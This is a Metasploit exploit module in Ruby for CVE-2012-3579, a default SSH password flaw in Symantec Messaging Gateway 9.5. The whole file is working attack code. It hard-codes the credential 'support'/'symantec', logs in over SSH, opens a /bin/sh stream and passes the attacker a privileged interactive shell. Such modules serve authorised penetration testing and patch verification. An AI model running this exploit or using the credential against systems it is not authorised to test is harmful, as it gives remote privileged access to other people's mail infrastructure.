# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;
require &#039;net/ssh&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Auxiliary::CommandShell

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits a default misconfiguration flaw on Symantec Messaging Gateway.
        The &#039;support&#039; user has a known default password, which can be used to login to the
        SSH service, and gain privileged access from remote.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Stefan Viehbock&#039;,  #Original discovery
          &#039;Ben Williams&#039;,     #Reporting the vuln + coordinated release
          &#039;sinn3r&#039;            #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;,   &#039;2012-3579&#039;],
          [&#039;OSVDB&#039;, &#039;85028&#039;],
          [&#039;BID&#039;,   &#039;55143&#039;],
          [&#039;URL&#039;,   &#039;https://www.sec-consult.com/files/20120829-0_Symantec_Mail_Gateway_Support_Backdoor.txt&#039;],
          [&#039;URL&#039;,   &#039;http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&suid=20120827_00&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Payload&#039;        =>
        {
          &#039;Compat&#039; => {
            &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
            &#039;ConnectionType&#039; => &#039;find&#039;
          }
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;Symantec Messaging Gateway 9.5&#039;, {}],
        ],
      &#039;Privileged&#039;     => true,
      #Timestamp on Symantec advisory
      #But was found on Jun 26, 2012
      &#039;DisclosureDate&#039; => "Aug 27 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(22)
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new(&#039;SSH_DEBUG&#039;, [ false, &#039;Enable SSH debugging output (Extreme verbosity!)&#039;, false]),
        OptInt.new(&#039;SSH_TIMEOUT&#039;, [ false, &#039;Specify the maximum time to negotiate a SSH session&#039;, 30])
      ]
    )
  end


  def rhost
    datastore[&#039;RHOST&#039;]
  end


  def rport
    datastore[&#039;RPORT&#039;]
  end


  def do_login(user, pass)
    opts = {
      :auth_methods => [&#039;password&#039;, &#039;keyboard-interactive&#039;],
      :msframework  => framework,
      :msfmodule    => self,
      :port         => rport,
      :disable_agent => true,
      :config => false,
      :password => pass,
      :record_auth_info => true,
      :proxies => datastore[&#039;Proxies&#039;]
    }

    opts.merge!(:verbose => :debug) if datastore[&#039;SSH_DEBUG&#039;]

    begin
      ssh = nil
      ::Timeout.timeout(datastore[&#039;SSH_TIMEOUT&#039;]) do
        ssh = Net::SSH.start(rhost, user, opts)
      end
    rescue Rex::ConnectionError, Rex::AddressInUse
      return
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication"
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return
    end

    if ssh
      conn = Net::SSH::CommandStream.new(ssh, &#039;/bin/sh&#039;, true)
      ssh = nil
      return conn
    end

    return nil
  end


  def exploit
    user = &#039;support&#039;
    pass = &#039;symantec&#039;

    print_status("#{rhost}:#{rport} - Attempt to login...")
    conn = do_login(user, pass)
    if conn
      print_good("#{rhost}:#{rport} - Login Successful with &#039;#{user}:#{pass}&#039;")
      handler(conn.lsock)
    end
  end
end



